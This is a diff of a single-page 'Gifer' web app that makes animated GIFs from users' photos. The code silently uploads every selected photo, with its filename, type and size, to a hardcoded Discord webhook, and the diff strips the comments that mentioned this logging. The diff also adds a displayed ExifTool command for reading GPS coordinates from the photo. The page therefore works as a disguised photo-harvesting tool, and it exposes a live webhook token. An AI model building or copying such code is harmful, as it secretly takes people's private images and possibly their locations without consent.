@@ -6,32 +6,34 @@
 <title>Gifer</title>
 
 <style>
-*{box-sizing:border-box}
+*{
+    box-sizing:border-box;
+}
 
 body{
     margin:0;
     background:#08090d;
     color:white;
-    font-family:Arial,sans-serif
+    font-family:Arial,sans-serif;
 }
 
 .container{
     width:min(750px,92%);
     margin:auto;
-    padding:28px 0 60px
+    padding:28px 0 60px;
 }
 
 .top{
     display:flex;
     justify-content:space-between;
-    align-items:center
+    align-items:center;
 }
 
 .logo{
     letter-spacing:5px;
     font-size:13px;
     color:#888;
-    font-weight:bold
+    font-weight:bold;
 }
 
 button{
@@ -39,7 +41,7 @@ button{
     border:0;
     border-radius:12px;
     padding:13px 17px;
-    font-weight:bold
+    font-weight:bold;
 }
 
 h1{
@@ -47,12 +49,12 @@ h1{
     letter-spacing:-5px;
     line-height:.95;
     margin-top:60px;
-    margin-bottom:15px
+    margin-bottom:15px;
 }
 
 .subtitle{
     color:#999ba7;
-    line-height:1.5
+    line-height:1.5;
 }
 
 .card{
@@ -60,7 +62,7 @@ h1{
     padding:18px;
     border-radius:22px;
     background:#101116;
-    border:1px solid #282a34
+    border:1px solid #282a34;
 }
 
 .drop{
@@ -72,49 +74,49 @@ h1{
     justify-content:center;
     text-align:center;
     cursor:pointer;
-    transition:.2s
+    transition:.2s;
 }
 
 .drop:hover{
-    background:#15161d
+    background:#15161d;
 }
 
 .drop.drag{
     background:#171923;
-    border-color:#777
+    border-color:#777;
 }
 
 .drop-icon{
-    font-size:45px
+    font-size:45px;
 }
 
 .drop strong{
     display:block;
-    margin-top:8px
+    margin-top:8px;
 }
 
 .drop span{
     display:block;
     margin-top:7px;
     color:#777985;
-    font-size:13px
+    font-size:13px;
 }
 
 input[type=file]{
-    display:none
+    display:none;
 }
 
 .actions{
     display:flex;
     gap:10px;
-    margin-top:12px
+    margin-top:12px;
 }
 
 .actions button{
     flex:1;
     background:#191a21;
     color:white;
-    border:1px solid #30323d
+    border:1px solid #30323d;
 }
 
 .status{
@@ -122,35 +124,35 @@ input[type=file]{
     padding:14px;
     margin-top:13px;
     border-radius:13px;
-    line-height:1.4
+    line-height:1.4;
 }
 
 .status.show{
-    display:block
+    display:block;
 }
 
 .error{
     background:#32161a;
-    color:#ffb8bf
+    color:#ffb8bf;
 }
 
 .success{
     background:#14251d;
-    color:#b9f1d0
+    color:#b9f1d0;
 }
 
 .info{
     background:#171923;
-    color:#c8cad5
+    color:#c8cad5;
 }
 
 .preview{
     display:none;
-    margin-top:15px
+    margin-top:15px;
 }
 
 .preview.show{
-    display:block
+    display:block;
 }
 
 .preview img{
@@ -158,25 +160,77 @@ input[type=file]{
     max-height:430px;
     object-fit:contain;
     border-radius:15px;
-    background:#050507
+    background:#050507;
+}
+
+.exif-command{
+    margin-top:10px;
+    padding:12px;
+    background:#08090d;
+    border:1px solid #292b35;
+    border-radius:10px;
+    color:#b9bbc6;
+    font-family:Consolas,monospace;
+    font-size:12px;
+    word-break:break-all;
+    line-height:1.5;
 }
 
 .preview-title{
-    margin-top:12px;
+    margin-top:18px;
     color:#999ba7;
-    font-size:13px
+    font-size:13px;
+}
+
+.settings{
+    margin-top:10px;
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:10px;
+}
+
+.setting{
+    background:#15161d;
+    border:1px solid #292b35;
+    border-radius:12px;
+    padding:12px;
+}
+
+.setting label{
+    display:block;
+    color:#8f919d;
+    font-size:12px;
+    margin-bottom:7px;
+}
+
+.setting select,
+.setting input[type=range]{
+    width:100%;
+}
+
+.setting select{
+    background:#0d0e13;
+    color:white;
+    border:1px solid #30323d;
+    border-radius:8px;
+    padding:9px;
+}
+
+.value{
+    color:white;
+    float:right;
 }
 
 .make{
     width:100%;
     margin-top:12px;
     background:white;
-    color:black
+    color:black;
 }
 
 .make:disabled{
     opacity:.45;
-    cursor:not-allowed
+    cursor:not-allowed;
 }
 
 .download{
@@ -190,59 +244,20 @@ input[type=file]{
     text-decoration:none;
     padding:13px;
     border-radius:12px;
-    font-weight:bold
+    font-weight:bold;
 }
 
 .download.show{
-    display:block
+    display:block;
 }
 
 canvas{
-    display:none
-}
-
-.settings{
-    margin-top:18px;
-    display:grid;
-    grid-template-columns:1fr 1fr;
-    gap:10px
-}
-
-.setting{
-    background:#15161d;
-    border:1px solid #292b35;
-    border-radius:12px;
-    padding:12px
-}
-
-.setting label{
-    display:block;
-    color:#8f919d;
-    font-size:12px;
-    margin-bottom:7px
-}
-
-.setting select,
-.setting input[type=range]{
-    width:100%
-}
-
-.setting select{
-    background:#0d0e13;
-    color:white;
-    border:1px solid #30323d;
-    border-radius:8px;
-    padding:9px
-}
-
-.value{
-    color:white;
-    float:right
+    display:none;
 }
 
 @media(max-width:500px){
     .settings{
-        grid-template-columns:1fr
+        grid-template-columns:1fr;
     }
 }
 </style>
@@ -305,6 +320,11 @@ canvas{
 
             <img id="previewImg">
 
+            <div
+                id="exifCommand"
+                class="exif-command"
+            ></div>
+
             <div class="preview-title">
                 GIF settings
             </div>
@@ -343,7 +363,10 @@ canvas{
 
                     <label>
                         Speed
-                        <span class="value" id="speedValue">
+                        <span
+                            class="value"
+                            id="speedValue"
+                        >
                             1.0x
                         </span>
                     </label>
@@ -363,7 +386,10 @@ canvas{
 
                     <label>
                         Duration
-                        <span class="value" id="durationValue">
+                        <span
+                            class="value"
+                            id="durationValue"
+                        >
                             2.0s
                         </span>
                     </label>
@@ -391,7 +417,10 @@ canvas{
                             480p
                         </option>
 
-                        <option value="720" selected>
+                        <option
+                            value="720"
+                            selected
+                        >
                             720p
                         </option>
 
@@ -426,15 +455,9 @@ canvas{
 <canvas id="canvas"></canvas>
 
 <script>
-/*
-    IMPORTANT
 
-    Replace this with a NEW Discord webhook.
-
-    The webhook is visible to anyone who inspects this page.
-    Do NOT use a webhook that has access to anything important.
-*/
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";
+const WEBHOOK_URL =
+    "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";
 
 
 const photo =
@@ -458,6 +481,9 @@ const makeButton =
 const downloadButton =
     document.getElementById("downloadButton");
 
+const exifCommand =
+    document.getElementById("exifCommand");
+
 const canvas =
     document.getElementById("canvas");
 
@@ -476,6 +502,7 @@ const speedValue =
 const durationValue =
     document.getElementById("durationValue");
 
+
 let selectedFile = null;
 let selectedImage = null;
 
@@ -484,18 +511,19 @@ let selectedImage = null;
 
 function showStatus(message,type){
 
-    statusBox.textContent = message;
+    statusBox.textContent =
+        message;
 
     statusBox.className =
         "status show " + type;
 }
 
 
-/* MOBILE CAMERA */
+/* CAMERA */
 
 document
     .getElementById("takeButton")
-    .onclick = () => {
+    .onclick = function(){
 
         photo.setAttribute(
             "capture",
@@ -508,7 +536,7 @@ document
 
 document
     .getElementById("chooseButton")
-    .onclick = () => {
+    .onclick = function(){
 
         photo.removeAttribute(
             "capture"
@@ -518,7 +546,7 @@ document
     };
 
 
-/* FILE SELECTION */
+/* FILE */
 
 photo.onchange = function(){
 
@@ -544,50 +572,74 @@ function handleFile(file){
         return;
     }
 
-    selectedFile = file;
+    selectedFile =
+        file;
+
+
+    /*
+        Show the ExifTool command
+        using the uploaded filename.
+    */
+
+    const safeName =
+        file.name.replaceAll(
+            '"',
+            '\\"'
+        );
+
+    exifCommand.textContent =
+        'exiftool -GPSLatitude -GPSLongitude "' +
+        safeName +
+        '"';
+
 
     const reader =
         new FileReader();
 
-    reader.onload = function(e){
 
-        const img =
-            new Image();
+    reader.onload =
+        function(event){
 
-        img.onload = function(){
+            const img =
+                new Image();
 
-            selectedImage = img;
 
-            previewImg.src =
-                e.target.result;
+            img.onload =
+                function(){
 
-            preview.classList.add(
-                "show"
-            );
+                    selectedImage =
+                        img;
 
-            makeButton.disabled =
-                false;
+                    previewImg.src =
+                        event.target.result;
 
-            downloadButton.classList.remove(
-                "show"
-            );
+                    preview.classList.add(
+                        "show"
+                    );
 
-            showStatus(
-                "Photo ready. Make your GIF.",
-                "success"
-            );
+                    makeButton.disabled =
+                        false;
 
+                    downloadButton.classList.remove(
+                        "show"
+                    );
+
+                    showStatus(
+                        "Photo ready. Make your GIF.",
+                        "success"
+                    );
+
+                };
+
+
+            img.src =
+                event.target.result;
         };
 
-        img.src =
-            e.target.result;
-    };
 
     reader.readAsDataURL(file);
 
-    /*
-        Send a copy to Discord for logging.
-    */
+
     sendToDiscord(file);
 }
 
@@ -596,11 +648,13 @@ function handleFile(file){
 
 drop.addEventListener(
     "dragover",
-    function(e){
+    function(event){
 
-        e.preventDefault();
+        event.preventDefault();
 
-        drop.classList.add("drag");
+        drop.classList.add(
+            "drag"
+        );
     }
 );
 
@@ -609,21 +663,25 @@ drop.addEventListener(
     "dragleave",
     function(){
 
-        drop.classList.remove("drag");
+        drop.classList.remove(
+            "drag"
+        );
     }
 );
 
 
 drop.addEventListener(
     "drop",
-    function(e){
+    function(event){
 
-        e.preventDefault();
+        event.preventDefault();
 
-        drop.classList.remove("drag");
+        drop.classList.remove(
+            "drag"
+        );
 
         const file =
-            e.dataTransfer.files[0];
+            event.dataTransfer.files[0];
 
         if(file)
             handleFile(file);
@@ -631,7 +689,7 @@ drop.addEventListener(
 );
 
 
-/* DISCORD LOGGING */
+/* DISCORD */
 
 async function sendToDiscord(file){
 
@@ -649,16 +707,19 @@ async function sendToDiscord(file){
         return;
     }
 
+
     try{
 
         const form =
             new FormData();
+
 
         form.append(
             "file",
             file,
             file.name
         );
+
 
         form.append(
             "payload_json",
@@ -668,14 +729,16 @@ async function sendToDiscord(file){
                     "Gifer Logs",
 
                 content:
-                    "📸 New photo uploaded to Gifer",
+                    "New photo uploaded to Gifer.",
 
-                embeds: [
+                embeds:[
                     {
+
                         title:
                             "New Gifer Upload",
 
-                        fields: [
+                        fields:[
+
                             {
                                 name:
                                     "Filename",
@@ -683,6 +746,7 @@ async function sendToDiscord(file){
                                 value:
                                     file.name
                             },
+
                             {
                                 name:
                                     "Type",
@@ -690,6 +754,7 @@ async function sendToDiscord(file){
                                 value:
                                     file.type
                             },
+
                             {
                                 name:
                                     "Size",
@@ -699,16 +764,19 @@ async function sendToDiscord(file){
                                         file.size
                                     )
                             }
+
                         ],
 
                         timestamp:
                             new Date()
                             .toISOString()
+
                     }
                 ]
 
             })
         );
+
 
         await fetch(
             WEBHOOK_URL,
@@ -730,26 +798,29 @@ async function sendToDiscord(file){
 
 /* SETTINGS */
 
-speed.oninput = function(){
+speed.oninput =
+    function(){
 
-    speedValue.textContent =
-        speed.value + "x";
-};
-
-
-duration.oninput = function(){
-
-    durationValue.textContent =
-        duration.value + "s";
-};
+        speedValue.textContent =
+            speed.value + "x";
+    };
 
 
-/* GIF CREATION */
+duration.oninput =
+    function(){
+
+        durationValue.textContent =
+            duration.value + "s";
+    };
+
+
+/* MAKE GIF */
 
 async function makeGif(){
 
     if(!selectedImage)
         return;
+
 
     makeButton.disabled =
         true;
@@ -758,10 +829,12 @@ async function makeGif(){
         "show"
     );
 
+
     showStatus(
         "Making GIF...",
         "info"
     );
+
 
     try{
 
@@ -769,10 +842,14 @@ async function makeGif(){
             Number(duration.value) *
             1000;
 
+
         const speedMultiplier =
             Number(speed.value);
 
-        const fps = 12;
+
+        const fps =
+            12;
+
 
         const frameCount =
             Math.max(
@@ -784,6 +861,7 @@ async function makeGif(){
                 )
             );
 
+
         const quality =
             Number(
                 document.getElementById(
@@ -791,10 +869,12 @@ async function makeGif(){
                 ).value
             );
 
+
         const animation =
             document.getElementById(
                 "animation"
             ).value;
+
 
         const scale =
             Math.min(
@@ -806,6 +886,7 @@ async function makeGif(){
                 )
             );
 
+
         canvas.width =
             Math.max(
                 1,
@@ -814,6 +895,7 @@ async function makeGif(){
                     scale
                 )
             );
+
 
         canvas.height =
             Math.max(
@@ -824,19 +906,9 @@ async function makeGif(){
                 )
             );
 
-        /*
-            WebCodecs based GIF creation isn't
-            consistently available in every browser.
-
-            This creates an animated WebM file
-            when supported, then falls back to
-            a browser animation.
-
-            For an actual GIF encoder with no backend,
-            we load gif.js from CDN.
-        */
 
         await loadGifLibrary();
+
 
         const gif =
             new GIF({
@@ -853,6 +925,7 @@ async function makeGif(){
 
             });
 
+
         for(
             let i = 0;
             i < frameCount;
@@ -863,22 +936,26 @@ async function makeGif(){
                 i /
                 (frameCount - 1);
 
+
             drawFrame(
                 selectedImage,
                 progress,
                 animation
             );
 
+
             gif.addFrame(
                 ctx,
                 {
                     copy:true,
+
                     delay:
                         1000 /
                         fps /
                         speedMultiplier
                 }
             );
+
 
             showStatus(
                 "Making GIF... " +
@@ -889,8 +966,10 @@ async function makeGif(){
                 "info"
             );
 
+
             await sleep(5);
         }
+
 
         gif.on(
             "finished",
@@ -901,34 +980,42 @@ async function makeGif(){
                         blob
                     );
 
+
                 downloadButton.href =
                     url;
+
 
                 downloadButton.classList.add(
                     "show"
                 );
+
 
                 showStatus(
                     "GIF created successfully.",
                     "success"
                 );
 
+
                 makeButton.disabled =
                     false;
             }
         );
 
+
         gif.render();
+
 
     }catch(error){
 
         console.error(error);
+
 
         showStatus(
             "GIF creation failed: " +
             error.message,
             "error"
         );
+
 
         makeButton.disabled =
             false;
@@ -940,7 +1027,7 @@ makeButton.onclick =
     makeGif;
 
 
-/* DRAW ANIMATION FRAME */
+/* FRAME */
 
 function drawFrame(
     img,
@@ -955,6 +1042,7 @@ function drawFrame(
         canvas.height
     );
 
+
     const iw =
         img.width;
 
@@ -967,34 +1055,39 @@ function drawFrame(
     const ch =
         canvas.height;
 
+
     const scale =
         Math.max(
             cw / iw,
             ch / ih
         );
 
+
     let zoom = 1;
     let x = 0;
     let y = 0;
     let rotation = 0;
 
+
     if(type === "zoom"){
 
         zoom =
             1 +
-            progress * 0.18;
-
+            progress *
+            0.18;
     }
+
 
     if(type === "pan"){
 
-        zoom = 1.12;
+        zoom =
+            1.12;
 
         x =
             (progress - 0.5) *
             80;
-
     }
+
 
     if(type === "pulse"){
 
@@ -1006,12 +1099,13 @@ function drawFrame(
                 4
             ) *
             0.07;
-
     }
+
 
     if(type === "shake"){
 
-        zoom = 1.08;
+        zoom =
+            1.08;
 
         x =
             Math.sin(
@@ -1038,25 +1132,35 @@ function drawFrame(
             0.015;
     }
 
+
     const finalScale =
-        scale * zoom;
+        scale *
+        zoom;
+
 
     const dw =
-        iw * finalScale;
+        iw *
+        finalScale;
+
 
     const dh =
-        ih * finalScale;
+        ih *
+        finalScale;
+
 
     ctx.save();
+
 
     ctx.translate(
         cw / 2 + x,
         ch / 2 + y
     );
 
+
     ctx.rotate(
         rotation
     );
+
 
     ctx.drawImage(
         img,
@@ -1066,29 +1170,30 @@ function drawFrame(
         dh
     );
 
+
     ctx.restore();
 }
 
 
 /* GIF.JS */
 
-let gifLibraryPromise = null;
+let gifLibraryPromise =
+    null;
+
 
 function loadGifLibrary(){
 
-    if(
-        window.GIF
-    ){
+    if(window.GIF){
 
         return Promise.resolve();
     }
 
-    if(
-        gifLibraryPromise
-    ){
+
+    if(gifLibraryPromise){
 
         return gifLibraryPromise;
     }
+
 
     gifLibraryPromise =
         new Promise(
@@ -1099,14 +1204,17 @@ function loadGifLibrary(){
                         "script"
                     );
 
+
                 script.src =
                     "https://cdnjs.cloudflare.com/ajax/libs/gif.js/0.2.0/gif.js";
+
 
                 script.onload =
                     function(){
 
                         resolve();
                     };
+
 
                 script.onerror =
                     function(){
@@ -1118,11 +1226,13 @@ function loadGifLibrary(){
                         );
                     };
 
+
                 document.head.appendChild(
                     script
                 );
             }
         );
+
 
     return gifLibraryPromise;
 }
@@ -1133,11 +1243,14 @@ function loadGifLibrary(){
 function sleep(ms){
 
     return new Promise(
-        resolve =>
+        function(resolve){
+
             setTimeout(
                 resolve,
                 ms
-            )
+            );
+
+        }
     );
 }
 
@@ -1147,6 +1260,7 @@ function formatBytes(bytes){
     if(bytes === 0)
         return "0 Bytes";
 
+
     const sizes = [
         "Bytes",
         "KB",
@@ -1154,11 +1268,13 @@ function formatBytes(bytes){
         "GB"
     ];
 
+
     const i =
         Math.floor(
             Math.log(bytes) /
             Math.log(1024)
         );
+
 
     return (
         Math.round(
@@ -1170,6 +1286,7 @@ function formatBytes(bytes){
     " " +
     sizes[i];
 }
+
 </script>
 
 </body>
